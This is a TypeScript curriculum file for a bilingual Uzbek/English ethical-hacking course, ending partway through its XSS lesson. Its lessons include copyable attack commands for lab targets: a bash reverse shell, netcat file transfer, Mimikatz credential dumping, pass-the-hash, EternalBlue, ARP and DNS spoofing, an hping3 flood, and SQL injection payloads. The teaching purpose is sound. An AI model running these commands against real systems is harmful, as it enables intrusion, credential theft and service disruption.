// Cyber Alsamos — full curriculum (8 modules + capstone).
// Bilingual (UZ/EN). Each lesson has reading content + commands to copy.
export type LessonStep = {
  command: string;
  hint?: { uz: string; en: string };
  expect?: string | RegExp;
};

export type LessonSection = {
  heading: { uz: string; en: string };
  body: { uz: string; en: string };
};

export type Lesson = {
  id: string;
  title: { uz: string; en: string };
  intro: { uz: string; en: string };
  objectives: { uz: string[]; en: string[] };
  sections?: LessonSection[];
  steps: LessonStep[];
  duration?: number; // minutes
  difficulty?: "beginner" | "intermediate" | "advanced";
  fs?: Record<string, string>;
  cwd?: string;
};

export type Track = {
  id: string;
  number: number;
  icon:
    | "shield"
    | "server"
    | "terminal"
    | "windows"
    | "network"
    | "wrench"
    | "globe"
    | "bomb"
    | "scroll";
  accent: "primary" | "accent" | "info" | "danger" | "warning";
  title: { uz: string; en: string };
  description: { uz: string; en: string };
  lessons: Lesson[];
};

const k = (uz: string, en: string) => ({ uz, en });

export const TRACKS: Track[] = [
  // ============ MODULE 1 ============
  {
    id: "intro",
    number: 1,
    icon: "shield",
    accent: "primary",
    title: k("Kirish va Asoslar", "Introduction & Foundations"),
    description: k(
      "Kiberxavfsizlik nima, asosiy tushunchalar va etik xakerlik prinsiplari.",
      "What cybersecurity is, core concepts, and ethical hacking principles.",
    ),
    lessons: [
      {
        id: "what-is-cybersecurity",
        difficulty: "beginner",
        duration: 15,
        title: k(
          "Kiberxavfsizlik nima?",
          "What is cybersecurity?",
        ),
        intro: k(
          "Kiberxavfsizlik — raqamli aktivlarni (ma'lumot, tizim, tarmoq) ruxsatsiz kirish, o'zgartirish va buzilishdan himoya qilish ilmidir.",
          "Cybersecurity is the discipline of protecting digital assets (data, systems, networks) from unauthorized access, modification, and destruction.",
        ),
        objectives: {
          uz: [
            "Xavf, tahdid va zaiflik farqini tushunish",
            "Asosiy hujum vektorlarini bilish",
            "Himoyaning 3 qatlamini ajratish",
          ],
          en: [
            "Distinguish risk, threat, and vulnerability",
            "Know the main attack vectors",
            "Identify the 3 layers of defense",
          ],
        },
        sections: [
          {
            heading: k("Asosiy tushunchalar", "Core terms"),
            body: k(
              "**Asset (aktiv)** — himoyaga muhtoj qiymat (ma'lumot, server, brend).\n**Threat (tahdid)** — aktivni zararlash imkoniyati (xaker, virus, tabiiy ofat).\n**Vulnerability (zaiflik)** — tahdid foydalana oladigan kamchilik (eski OS, zaif parol).\n**Risk (xavf)** = Tahdid × Zaiflik × Aktiv qiymati.\n**Exploit** — zaiflikdan foydalanuvchi konkret kod yoki texnika.",
              "**Asset** — anything of value to protect (data, servers, brand).\n**Threat** — a potential cause of harm (attacker, malware, disaster).\n**Vulnerability** — a weakness a threat can exploit (outdated OS, weak password).\n**Risk** = Threat × Vulnerability × Asset value.\n**Exploit** — concrete code or technique using a vulnerability.",
            ),
          },
          {
            heading: k("Hujum vektorlari", "Attack vectors"),
            body: k(
              "1. **Phishing** — soxta xat orqali parol o'g'irlash.\n2. **Malware** — virus, trojan, ransomware.\n3. **Network attacks** — MITM, DDoS, port scanning.\n4. **Web vulnerabilities** — SQLi, XSS, IDOR.\n5. **Insider threat** — ichki xodim tomonidan zarar.\n6. **Supply chain** — uchinchi tomon kutubxonasi orqali.",
              "1. **Phishing** — credential theft via fake emails.\n2. **Malware** — viruses, trojans, ransomware.\n3. **Network attacks** — MITM, DDoS, port scanning.\n4. **Web vulnerabilities** — SQLi, XSS, IDOR.\n5. **Insider threat** — damage from an internal actor.\n6. **Supply chain** — through third-party libraries.",
            ),
          },
        ],
        steps: [
          {
            command: "echo 'Risk = Threat × Vulnerability × Impact'",
            hint: k("Risk formulasi", "Risk formula"),
          },
        ],
      },
      {
        id: "cia-triad",
        difficulty: "beginner",
        duration: 12,
        title: k("CIA Triadasi", "The CIA Triad"),
        intro: k(
          "CIA — Confidentiality, Integrity, Availability. Axborot xavfsizligining 3 ustuni.",
          "CIA — Confidentiality, Integrity, Availability. The 3 pillars of information security.",
        ),
        objectives: {
          uz: [
            "Maxfiylik (Confidentiality) ma'nosini tushunish",
            "Yaxlitlik (Integrity) misollarini bilish",
            "Mavjudlik (Availability) ahamiyatini anglash",
          ],
          en: [
            "Understand Confidentiality",
            "Know Integrity examples",
            "Grasp Availability",
          ],
        },
        sections: [
          {
            heading: k("C — Confidentiality", "C — Confidentiality"),
            body: k(
              "Faqat huquqi bor shaxs ma'lumotni ko'rsin. Vositalar: shifrlash (AES, RSA), kirish nazorati (RBAC), MFA, parol siyosati.",
              "Only authorized parties see the data. Tools: encryption (AES, RSA), access control (RBAC), MFA, password policy.",
            ),
          },
          {
            heading: k("I — Integrity", "I — Integrity"),
            body: k(
              "Ma'lumot o'zgartirilmagan bo'lsin. Vositalar: hash funksiyalar (SHA-256), raqamli imzo, checksum, audit log.",
              "Data has not been tampered with. Tools: hash functions (SHA-256), digital signatures, checksums, audit logs.",
            ),
          },
          {
            heading: k("A — Availability", "A — Availability"),
            body: k(
              "Tizim kerak bo'lganda ishlasin. Vositalar: backup, redundancy, DDoS himoyasi, load balancer, disaster recovery.",
              "The system works when needed. Tools: backups, redundancy, DDoS protection, load balancers, disaster recovery.",
            ),
          },
        ],
        steps: [
          {
            command: "sha256sum important.txt",
            hint: k("Integrity tekshirish uchun hash", "Hash for integrity check"),
          },
          {
            command: "openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc",
            hint: k("Confidentiality uchun shifrlash", "Encryption for confidentiality"),
          },
        ],
      },
      {
        id: "hacker-types",
        difficulty: "beginner",
        duration: 10,
        title: k("Xakerlar turlari", "Types of hackers"),
        intro: k(
          "White, Black, Grey hat — niyat va qonuniylik bo'yicha tasniflash.",
          "White, Black, Grey hat — classified by intent and legality.",
        ),
        objectives: {
          uz: ["Har bir turni ajratish", "Bug bounty va red team farqi"],
          en: ["Distinguish each type", "Bug bounty vs red team"],
        },
        sections: [
          {
            heading: k("Asosiy turlar", "Main types"),
            body: k(
              "**White hat** — etik xaker, ruxsat bilan zaiflik topadi.\n**Black hat** — qonunbuzar, foyda yoki zarar uchun.\n**Grey hat** — ruxsatsiz tekshiradi, lekin oshkor qiladi.\n**Script kiddie** — tayyor vositalardan foydalanuvchi.\n**Hacktivist** — siyosiy maqsad uchun (Anonymous).\n**State-sponsored (APT)** — davlat tomonidan moliyalashtirilgan.",
              "**White hat** — ethical, finds vulns with permission.\n**Black hat** — illegal, for profit or harm.\n**Grey hat** — unauthorized but discloses.\n**Script kiddie** — uses ready-made tools.\n**Hacktivist** — political (Anonymous).\n**State-sponsored (APT)** — government-funded.",
            ),
          },
        ],
        steps: [
          {
            command: "# Bug Bounty platformalar: HackerOne, Bugcrowd, Intigriti",
            hint: k("Etik daromad manbalari", "Ethical income sources"),
          },
        ],
      },
      {
        id: "ethics-law-uz",
        difficulty: "beginner",
        duration: 15,
        title: k(
          "O'zbekiston qonunchiligi",
          "Uzbekistan cyber law",
        ),
        intro: k(
          "Etik xaker bo'lish uchun qonunni bilish shart. O'zbekistondagi asosiy hujjatlar.",
          "An ethical hacker must know the law. Key Uzbek regulations.",
        ),
        objectives: {
          uz: [
            "Asosiy qonun hujjatlarini bilish",
            "Ruxsat (scope) qoidalarini tushunish",
            "Jinoiy javobgarlik chegaralari",
          ],
          en: [
            "Know main legal documents",
            "Understand scope rules",
            "Criminal liability boundaries",
          ],
        },
        sections: [
          {
            heading: k("Asosiy hujjatlar", "Key documents"),
            body: k(
              "1. **Axborotlashtirish to'g'risida**gi Qonun (2003)\n2. **Shaxsiy ma'lumotlar to'g'risida**gi Qonun (2019) — Roskomnadzor analogiga o'xshash\n3. **Kiberxavfsizlik to'g'risida**gi Qonun (2022)\n4. **Jinoyat kodeksi 278^1-2** moddalari — kompyuter jinoyatlari\n5. **KRITIS** — kritik infratuzilma obyektlari ro'yxati",
              "1. **Law on Informatization** (2003)\n2. **Law on Personal Data** (2019)\n3. **Law on Cybersecurity** (2022)\n4. **Criminal Code Articles 278^1-2** — computer crimes\n5. **KRITIS** — critical infrastructure list",
            ),
          },
          {
            heading: k("Pentest qoidalari", "Pentest rules"),
            body: k(
              "ALWAYS: yozma ruxsat (scope hujjat), aniq vaqt oralig'i, alohida test muhiti, hisobot mas'uliyati.\nNEVER: ruxsatsiz skanlash, real foydalanuvchi ma'lumotini eksport qilish, backdoor qoldirish.",
              "ALWAYS: written authorization (scope doc), defined timeframe, isolated test env, reporting duty.\nNEVER: unauthorized scanning, exfiltrating real user data, leaving backdoors.",
            ),
          },
        ],
        steps: [
          {
            command: "# Scope hujjatisiz hech qachon skan qilmang",
            hint: k("Asosiy qoida", "Golden rule"),
          },
        ],
      },
    ],
  },

  // ============ MODULE 2 ============
  {
    id: "lab-setup",
    number: 2,
    icon: "server",
    accent: "accent",
    title: k("Lab muhiti qurish", "Building your lab"),
    description: k(
      "VirtualBox, Kali Linux, Metasploitable va DVWA bilan xavfsiz mashq muhiti.",
      "Safe practice environment with VirtualBox, Kali Linux, Metasploitable and DVWA.",
    ),
    lessons: [
      {
        id: "virtualbox-install",
        difficulty: "beginner",
        duration: 20,
        title: k("VirtualBox o'rnatish", "Installing VirtualBox"),
        intro: k(
          "VirtualBox — bepul gipervizor. Asosiy OS ustida virtual mashinalarni boshqaradi.",
          "VirtualBox is a free hypervisor that runs virtual machines on top of your host OS.",
        ),
        objectives: {
          uz: [
            "VirtualBox va Extension Pack o'rnatish",
            "BIOS/UEFI'da virtualizatsiyani yoqish",
          ],
          en: [
            "Install VirtualBox and Extension Pack",
            "Enable virtualization in BIOS/UEFI",
          ],
        },
        sections: [
          {
            heading: k("Qadamlar", "Steps"),
            body: k(
              "1. virtualbox.org saytidan oxirgi versiyani yuklang.\n2. Extension Pack ham yuklang (USB, RDP).\n3. BIOS'da Intel VT-x yoki AMD-V'ni yoqing.\n4. O'rnatish: keyingi → keyingi → tugatish.\n5. Tekshirish: `VBoxManage --version`.",
              "1. Download the latest from virtualbox.org.\n2. Also download the Extension Pack (USB, RDP).\n3. Enable Intel VT-x or AMD-V in BIOS.\n4. Install: next → next → finish.\n5. Verify: `VBoxManage --version`.",
            ),
          },
        ],
        steps: [
          { command: "VBoxManage --version" },
          { command: "VBoxManage list vms" },
        ],
      },
      {
        id: "kali-install",
        difficulty: "beginner",
        duration: 30,
        title: k("Kali Linux o'rnatish", "Installing Kali Linux"),
        intro: k(
          "Kali — pentest uchun maxsus tayyorlangan Debian asosidagi distro. 600+ vosita.",
          "Kali is a Debian-based pentesting distro with 600+ tools pre-installed.",
        ),
        objectives: {
          uz: ["Kali ISO yuklash", "VM yaratish va o'rnatish", "Snapshot olish"],
          en: ["Download Kali ISO", "Create and install the VM", "Take a snapshot"],
        },
        sections: [
          {
            heading: k("Asosiy qadamlar", "Main steps"),
            body: k(
              "1. kali.org/get-kali → Installer Image yoki tayyor VirtualBox image.\n2. VM yaratish: 4 GB RAM, 40 GB disk, 2 CPU.\n3. ISO'ni biriktirib o'rnatish (graphical install).\n4. `apt update && apt full-upgrade -y`.\n5. Snapshot: 'clean-install' nomi bilan.",
              "1. kali.org/get-kali → Installer Image or pre-built VirtualBox image.\n2. Create VM: 4 GB RAM, 40 GB disk, 2 CPU.\n3. Mount ISO and install (graphical).\n4. `apt update && apt full-upgrade -y`.\n5. Snapshot named 'clean-install'.",
            ),
          },
        ],
        steps: [
          { command: "sudo apt update && sudo apt full-upgrade -y" },
          { command: "kali-tweaks" },
          { command: "VBoxManage snapshot Kali take clean-install" },
        ],
      },
      {
        id: "network-modes",
        difficulty: "beginner",
        duration: 15,
        title: k("Network rejimlar", "Network modes"),
        intro: k(
          "NAT, Host-only, Bridged, Internal — lab xavfsizligi uchun to'g'ri rejimni tanlash.",
          "NAT, Host-only, Bridged, Internal — pick the right mode for safe labs.",
        ),
        objectives: {
          uz: ["Har bir rejimning farqi", "Izolyatsiya qilingan lab qurish"],
          en: ["Difference between modes", "Build an isolated lab"],
        },
        sections: [
          {
            heading: k("Rejimlar", "Modes"),
            body: k(
              "**NAT** — VM internetga chiqadi, lekin tashqaridan kirib bo'lmaydi.\n**Bridged** — VM real tarmoqda alohida qurilma sifatida.\n**Host-only** — faqat host bilan ulanish, internet yo'q.\n**Internal** — faqat VM'lar orasida.\n\nMashq uchun: Kali + Metasploitable Host-only yoki Internal'da bo'lsin — real tarmoqqa zarar bermasligi uchun.",
              "**NAT** — VM gets internet but not reachable from outside.\n**Bridged** — VM appears as a real device on the LAN.\n**Host-only** — only host-VM connection, no internet.\n**Internal** — only between VMs.\n\nFor labs: keep Kali + Metasploitable on Host-only or Internal so they can't harm the real network.",
            ),
          },
        ],
        steps: [
          { command: "ip a" },
          { command: "ip route" },
        ],
      },
      {
        id: "vuln-targets",
        difficulty: "beginner",
        duration: 20,
        title: k("Zaif maqsadlar (DVWA, Metasploitable)", "Vulnerable targets"),
        intro: k(
          "Qonuniy ravishda hujum qilish uchun maxsus zaif tizimlarni o'rnatamiz.",
          "Install legally-attackable, intentionally-vulnerable systems.",
        ),
        objectives: {
          uz: ["Metasploitable 2 ishga tushirish", "DVWA Docker'da", "TryHackMe ro'yxat"],
          en: ["Run Metasploitable 2", "DVWA in Docker", "Sign up for TryHackMe"],
        },
        sections: [
          {
            heading: k("Resurslar", "Resources"),
            body: k(
              "- **Metasploitable 2** — eski, ko'p zaiflikli Linux VM.\n- **DVWA** — Damn Vulnerable Web App, PHP+MySQL.\n- **OWASP Juice Shop** — zamonaviy SPA, OWASP Top 10.\n- **HackTheBox**, **TryHackMe**, **VulnHub** — onlayn poligonlar.",
              "- **Metasploitable 2** — old Linux VM full of holes.\n- **DVWA** — Damn Vulnerable Web App, PHP+MySQL.\n- **OWASP Juice Shop** — modern SPA, OWASP Top 10.\n- **HackTheBox**, **TryHackMe**, **VulnHub** — online ranges.",
            ),
          },
        ],
        steps: [
          { command: "docker run --rm -it -p 80:80 vulnerables/web-dvwa" },
          { command: "docker run --rm -p 3000:3000 bkimminich/juice-shop" },
        ],
      },
    ],
  },

  // ============ MODULE 3 ============
  {
    id: "linux",
    number: 3,
    icon: "terminal",
    accent: "primary",
    title: k("Linux Mastery", "Linux Mastery"),
    description: k(
      "Fayl tizimi, foydalanuvchilar, ruxsatlar, bash, SSH, firewall — hacker'ning poydevori.",
      "Filesystem, users, permissions, bash, SSH, firewall — every hacker's foundation.",
    ),
    lessons: [
      {
        id: "navigation",
        difficulty: "beginner",
        duration: 10,
        title: k("Fayl tizimida harakat", "Filesystem navigation"),
        intro: k(
          "pwd, ls, cd, find — Linux'da yo'l topishning asoslari.",
          "pwd, ls, cd, find — basics of moving around Linux.",
        ),
        objectives: {
          uz: ["Joriy joylashuv", "Katalog tarkibi", "Fayl izlash"],
          en: ["Current location", "List directory", "Search files"],
        },
        steps: [
          { command: "pwd", expect: "/home/hacker" },
          { command: "ls -la", expect: "notes.txt" },
          { command: "cd loot && ls" },
          { command: "find / -name '*.conf' 2>/dev/null | head -5" },
        ],
      },
      {
        id: "users-perms",
        difficulty: "intermediate",
        duration: 20,
        title: k("Foydalanuvchi va ruxsatlar", "Users and permissions"),
        intro: k(
          "/etc/passwd, /etc/shadow, sudo, chmod, chown — kim nima qila oladi?",
          "/etc/passwd, /etc/shadow, sudo, chmod, chown — who can do what?",
        ),
        objectives: {
          uz: [
            "Foydalanuvchi yaratish va o'chirish",
            "chmod sintaksisi (rwx, raqamli)",
            "SUID/SGID xavfini tushunish",
          ],
          en: [
            "Create and delete users",
            "chmod syntax (rwx, octal)",
            "Understand SUID/SGID risks",
          ],
        },
        sections: [
          {
            heading: k("Permissions", "Permissions"),
            body: k(
              "`rwxrwxrwx` = owner / group / other.\nRaqamli: r=4, w=2, x=1. `chmod 755` = rwxr-xr-x.\n**SUID** (s) — bajarilganda fayl egasi nomidan ishlaydi → privesc vektori. `find / -perm -4000 2>/dev/null` orqali topiladi.",
              "`rwxrwxrwx` = owner / group / other.\nOctal: r=4, w=2, x=1. `chmod 755` = rwxr-xr-x.\n**SUID** (s) — runs as file owner when executed → privesc vector. Find with `find / -perm -4000 2>/dev/null`.",
            ),
          },
        ],
        steps: [
          { command: "sudo useradd -m alice && sudo passwd alice" },
          { command: "id alice" },
          { command: "chmod 750 secret.sh" },
          { command: "find / -perm -4000 -type f 2>/dev/null" },
        ],
      },
      {
        id: "bash-scripting",
        difficulty: "intermediate",
        duration: 25,
        title: k("Bash scripting", "Bash scripting"),
        intro: k(
          "Avtomatlashtirish — har qanday hacker'ning superkuchi.",
          "Automation — every hacker's superpower.",
        ),
        objectives: {
          uz: ["O'zgaruvchi va shartli", "Loop", "Funksiya yozish"],
          en: ["Variables and conditionals", "Loops", "Writing functions"],
        },
        steps: [
          { command: "echo '#!/bin/bash\\nfor i in {1..5}; do echo host-$i; done' > scan.sh" },
          { command: "chmod +x scan.sh && ./scan.sh" },
          {
            command:
              "for ip in $(seq 1 10); do ping -c1 -W1 192.168.1.$ip &>/dev/null && echo 192.168.1.$ip up; done",
            hint: k("Oddiy host discovery", "Simple host discovery"),
          },
        ],
      },
      {
        id: "ssh-firewall",
        difficulty: "intermediate",
        duration: 20,
        title: k("SSH, UFW, Fail2Ban", "SSH, UFW, Fail2Ban"),
        intro: k(
          "Serveringizni qattiqlashtirish (hardening) uchun asosiy vositalar.",
          "Core tools to harden your server.",
        ),
        objectives: {
          uz: ["SSH key auth", "UFW qoidalari", "Fail2Ban filterlar"],
          en: ["SSH key auth", "UFW rules", "Fail2Ban filters"],
        },
        steps: [
          { command: "ssh-keygen -t ed25519 -C 'cyber@alsamos'" },
          { command: "ssh-copy-id user@target" },
          { command: "sudo ufw default deny incoming && sudo ufw allow 22/tcp && sudo ufw enable" },
          { command: "sudo systemctl status fail2ban" },
        ],
      },
      {
        id: "wireshark-tcpdump",
        difficulty: "intermediate",
        duration: 20,
        title: k("Wireshark va tcpdump", "Wireshark and tcpdump"),
        intro: k(
          "Tarmoq paketlarini real vaqtda kuzatish va tahlil qilish.",
          "Capture and analyze network packets in real time.",
        ),
        objectives: {
          uz: ["tcpdump filterlar", "Wireshark display filter"],
          en: ["tcpdump filters", "Wireshark display filters"],
        },
        steps: [
          { command: "sudo tcpdump -i eth0 -nn port 80" },
          { command: "sudo tcpdump -i any -w capture.pcap" },
          { command: "wireshark capture.pcap" },
        ],
      },
    ],
  },

  // ============ MODULE 4 ============
  {
    id: "windows",
    number: 4,
    icon: "windows",
    accent: "info",
    title: k("Windows Security", "Windows Security"),
    description: k(
      "NTFS, Registry, Active Directory va Windows hujum texnikalari.",
      "NTFS, Registry, Active Directory and Windows attack techniques.",
    ),
    lessons: [
      {
        id: "ntfs-registry",
        difficulty: "intermediate",
        duration: 20,
        title: k("NTFS va Registry", "NTFS and Registry"),
        intro: k(
          "Windows fayl tizimi va konfiguratsiya markazi.",
          "Windows filesystem and configuration hub.",
        ),
        objectives: {
          uz: ["icacls bilan ruxsatlar", "Registry hive tuzilishi"],
          en: ["Permissions with icacls", "Registry hive structure"],
        },
        steps: [
          { command: "icacls C:\\Users\\Public" },
          { command: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
        ],
      },
      {
        id: "active-directory",
        difficulty: "advanced",
        duration: 30,
        title: k("Active Directory asoslari", "Active Directory basics"),
        intro: k(
          "Domain Controller, OU, GPO, Kerberos — korxona tarmog'ining mag'zi.",
          "Domain Controller, OU, GPO, Kerberos — the heart of an enterprise network.",
        ),
        objectives: {
          uz: ["DC, OU, GPO terminlar", "BloodHound bilan enumeratsiya"],
          en: ["DC, OU, GPO terms", "Enumeration with BloodHound"],
        },
        steps: [
          { command: "Get-ADUser -Filter *" },
          { command: "bloodhound-python -u user -p pass -d corp.local -c All" },
        ],
      },
      {
        id: "windows-attacks",
        difficulty: "advanced",
        duration: 30,
        title: k("Mimikatz va Pass-the-Hash", "Mimikatz and Pass-the-Hash"),
        intro: k(
          "Lateral movement va credential dumping — Windows pentest klassikasi.",
          "Lateral movement and credential dumping — Windows pentest classics.",
        ),
        objectives: {
          uz: ["LSASS dump", "PtH bilan SMB session", "Mitigation: Credential Guard"],
          en: ["LSASS dump", "SMB session via PtH", "Mitigation: Credential Guard"],
        },
        steps: [
          { command: "mimikatz # privilege::debug" },
          { command: "mimikatz # sekurlsa::logonpasswords" },
          { command: "impacket-psexec -hashes :NTHASH admin@10.10.10.5" },
        ],
      },
      {
        id: "windows-privesc",
        difficulty: "advanced",
        duration: 25,
        title: k("Windows Privilege Escalation", "Windows Privilege Escalation"),
        intro: k(
          "Local admin'gacha ko'tarilish: misconfig, unquoted paths, AlwaysInstallElevated.",
          "Climb to local admin: misconfigs, unquoted paths, AlwaysInstallElevated.",
        ),
        objectives: {
          uz: ["WinPEAS bilan tekshirish", "Service misconfigs"],
          en: ["Check with WinPEAS", "Service misconfigs"],
        },
        steps: [
          { command: ".\\winPEASx64.exe" },
          { command: "wmic service get name,pathname,startmode | findstr /i auto" },
        ],
      },
    ],
  },

  // ============ MODULE 5 ============
  {
    id: "network",
    number: 5,
    icon: "network",
    accent: "info",
    title: k("Tarmoqshunoslik", "Networking"),
    description: k(
      "OSI, TCP/IP, DNS, nmap, Wireshark, MITM — hujum maydonini tushunish.",
      "OSI, TCP/IP, DNS, nmap, Wireshark, MITM — understanding the attack surface.",
    ),
    lessons: [
      {
        id: "osi-tcpip",
        difficulty: "beginner",
        duration: 20,
        title: k("OSI va TCP/IP modellari", "OSI and TCP/IP models"),
        intro: k(
          "Tarmoqning 7 (yoki 4) qatlami — har birida o'z hujumi.",
          "The 7 (or 4) layers of networking — each with its own attacks.",
        ),
        objectives: {
          uz: ["7 qatlam nomlari", "Har qatlamda misol hujum"],
          en: ["Names of the 7 layers", "Example attacks per layer"],
        },
        sections: [
          {
            heading: k("OSI qatlamlari", "OSI layers"),
            body: k(
              "1. Physical (kabel, signal)\n2. Data Link (MAC, ARP) — ARP spoofing\n3. Network (IP, ICMP) — IP spoofing\n4. Transport (TCP, UDP) — SYN flood\n5. Session\n6. Presentation (TLS) — SSL strip\n7. Application (HTTP, DNS) — XSS, SQLi, DNS poisoning",
              "1. Physical (cable, signal)\n2. Data Link (MAC, ARP) — ARP spoofing\n3. Network (IP, ICMP) — IP spoofing\n4. Transport (TCP, UDP) — SYN flood\n5. Session\n6. Presentation (TLS) — SSL strip\n7. Application (HTTP, DNS) — XSS, SQLi, DNS poisoning",
            ),
          },
        ],
        steps: [
          { command: "ip a" },
          { command: "ip route" },
          { command: "arp -a" },
        ],
      },
      {
        id: "nmap-deep",
        difficulty: "intermediate",
        duration: 25,
        title: k("Nmap chuqur", "Nmap deep dive"),
        intro: k(
          "Host discovery, port skan, versiya, NSE skriptlar — hammasi nmap'da.",
          "Host discovery, port scan, version, NSE scripts — all in nmap.",
        ),
        objectives: {
          uz: ["Skan turlari (-sS, -sT, -sU)", "Versiya (-sV)", "NSE skriptlar"],
          en: ["Scan types (-sS, -sT, -sU)", "Versioning (-sV)", "NSE scripts"],
        },
        steps: [
          { command: "nmap -sn 10.10.10.0/24", expect: "Nmap" },
          { command: "nmap -sS -sV -O -p- 10.10.10.5" },
          { command: "nmap --script=vuln 10.10.10.5" },
          { command: "nmap -sU --top-ports 50 10.10.10.5" },
        ],
      },
      {
        id: "wireshark",
        difficulty: "intermediate",
        duration: 20,
        title: k("Wireshark filterlar", "Wireshark filters"),
        intro: k(
          "Display filterlar bilan kerakli paketni topish.",
          "Find the packets you need with display filters.",
        ),
        objectives: {
          uz: ["Asosiy filterlar", "Follow TCP stream"],
          en: ["Core filters", "Follow TCP stream"],
        },
        steps: [
          { command: "tcp.port == 80" },
          { command: "ip.src == 10.10.10.5 && http" },
          { command: "tcp.flags.syn == 1 && tcp.flags.ack == 0" },
        ],
      },
      {
        id: "mitm-arp",
        difficulty: "advanced",
        duration: 25,
        title: k("MITM va ARP poisoning", "MITM and ARP poisoning"),
        intro: k(
          "ARP jadvalni zaharlash orqali trafikni o'zingiz orqali yo'naltirish.",
          "Poison the ARP table to route traffic through yourself.",
        ),
        objectives: {
          uz: ["arpspoof bilan poisoning", "Mitigation: Dynamic ARP Inspection"],
          en: ["Poison with arpspoof", "Mitigation: Dynamic ARP Inspection"],
        },
        steps: [
          { command: "echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward" },
          { command: "sudo arpspoof -i eth0 -t 10.10.10.5 -r 10.10.10.1" },
          { command: "sudo bettercap -iface eth0" },
        ],
      },
      {
        id: "dns-spoofing",
        difficulty: "advanced",
        duration: 20,
        title: k("DNS spoofing va DDoS asoslari", "DNS spoofing and DDoS basics"),
        intro: k(
          "DNS so'rovlariga soxta javob va DDoS hujumlarining mexanikasi.",
          "Forge DNS replies and understand the mechanics of DDoS.",
        ),
        objectives: {
          uz: ["dnschef yoki bettercap", "SYN flood (faqat lab!)"],
          en: ["dnschef or bettercap", "SYN flood (lab only!)"],
        },
        steps: [
          { command: "dnschef --fakeip=10.10.10.99 --fakedomains='bank.com'" },
          { command: "sudo hping3 -S -p 80 --flood lab.target" },
        ],
      },
    ],
  },

  // ============ MODULE 6 ============
  {
    id: "pentest-toolkit",
    number: 6,
    icon: "wrench",
    accent: "primary",
    title: k("Pentest Toolkit", "Pentest Toolkit"),
    description: k(
      "Metasploit, Burp Suite, Netcat — kasbiy pentester'ning arsenali.",
      "Metasploit, Burp Suite, Netcat — the professional pentester's arsenal.",
    ),
    lessons: [
      {
        id: "netcat",
        difficulty: "intermediate",
        duration: 20,
        title: k("Netcat — TCP/IP shveysar pichog'i", "Netcat — the TCP/IP swiss army knife"),
        intro: k(
          "Bind shell, reverse shell, fayl uzatish — netcat hammasini bajaradi.",
          "Bind shell, reverse shell, file transfer — netcat does it all.",
        ),
        objectives: {
          uz: ["Listener", "Reverse shell", "Fayl uzatish"],
          en: ["Listener", "Reverse shell", "File transfer"],
        },
        steps: [
          { command: "nc -lvnp 4444" },
          { command: "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" },
          { command: "nc target 4444 < secret.txt" },
        ],
      },
      {
        id: "metasploit",
        difficulty: "advanced",
        duration: 30,
        title: k("Metasploit Framework", "Metasploit Framework"),
        intro: k(
          "msfconsole, exploit, payload, meterpreter — eng kuchli pentest framework.",
          "msfconsole, exploit, payload, meterpreter — the most powerful pentest framework.",
        ),
        objectives: {
          uz: ["msfconsole asoslari", "Module yuklash", "Meterpreter sessiyasi"],
          en: ["msfconsole basics", "Loading a module", "Meterpreter session"],
        },
        steps: [
          { command: "msfconsole -q" },
          { command: "search type:exploit name:eternalblue" },
          { command: "use exploit/windows/smb/ms17_010_eternalblue" },
          { command: "set RHOSTS 10.10.10.5 && set PAYLOAD windows/x64/meterpreter/reverse_tcp" },
          { command: "exploit" },
        ],
      },
      {
        id: "burp-suite",
        difficulty: "intermediate",
        duration: 25,
        title: k("Burp Suite asoslari", "Burp Suite basics"),
        intro: k(
          "Web pentest uchun #1 vosita: proxy, repeater, intruder.",
          "The #1 web pentest tool: proxy, repeater, intruder.",
        ),
        objectives: {
          uz: ["Proxy sozlash", "Repeater bilan so'rov o'zgartirish", "Intruder fuzz"],
          en: ["Configure proxy", "Modify requests in Repeater", "Fuzz with Intruder"],
        },
        steps: [
          { command: "# Browser proxy: 127.0.0.1:8080" },
          { command: "# Burp CA sertifikatini import qiling" },
          { command: "# Repeater'da so'rovni yuborib, parametrlarni o'zgartiring" },
        ],
      },
    ],
  },

  // ============ MODULE 7 ============
  {
    id: "web",
    number: 7,
    icon: "globe",
    accent: "danger",
    title: k("Web Application Security", "Web Application Security"),
    description: k(
      "OWASP Top 10: XSS, SQLi, IDOR, CSRF, SSRF va boshqalar.",
      "OWASP Top 10: XSS, SQLi, IDOR, CSRF, SSRF and more.",
    ),
    lessons: [
      {
        id: "http-basics",
        difficulty: "beginner",
        duration: 15,
        title: k("HTTP, headers, cookies", "HTTP, headers, cookies"),
        intro: k(
          "Web hujumini tushunish uchun avval protokolni biling.",
          "Understand the protocol first to understand web attacks.",
        ),
        objectives: {
          uz: ["GET vs POST", "Asosiy headerlar", "Cookie atributlari"],
          en: ["GET vs POST", "Key headers", "Cookie attributes"],
        },
        steps: [
          { command: "curl -v https://target.lab" },
          { command: "curl -I https://target.lab" },
          {
            command: "curl -X POST -d 'user=admin&pass=x' https://target.lab/login",
          },
        ],
      },
      {
        id: "sql-injection",
        difficulty: "intermediate",
        duration: 30,
        title: k("SQL Injection", "SQL Injection"),
        intro: k(
          "Foydalanuvchi kiritmasini SQL'ga aralashtirish — klassik OWASP #1.",
          "Mixing user input into SQL — the classic OWASP #1.",
        ),
        objectives: {
          uz: ["Login bypass", "UNION-based", "Blind SQLi"],
          en: ["Login bypass", "UNION-based", "Blind SQLi"],
        },
        sections: [
          {
            heading: k("Misol payload'lar", "Example payloads"),
            body: k(
              "Login bypass: `admin' --`\nUNION: `' UNION SELECT username,password FROM users--`\nBlind: `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`",
              "Login bypass: `admin' --`\nUNION: `' UNION SELECT username,password FROM users--`\nBlind: `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`",
            ),
          },
        ],
        steps: [
          { command: "curl \"http://target.lab/login?u=admin'--&p=x\"", expect: "Welcome" },
          { command: "sqlmap -u 'http://target.lab/item?id=1' --dbs" },
          { command: "sqlmap -u 'http://target.lab/item?id=1' -D shop --tables" },
        ],
      },
      {
        id: "xss",
        difficulty: "intermediate",
        duration: 25,
        title: k("XSS (Cross-Site Scripting)", "XSS (Cross-Site Scripting)"),
        intro: k(
          "Brauzerda JS bajarish: reflected, stored, DOM-based.",
          "Execute JS in the victim's browser: reflected, stored, DOM-based.",
        ),
        objectives: {
          uz: ["3 XSS turi", "Cookie o'g'irlash payload", "CSP himoyasi"],
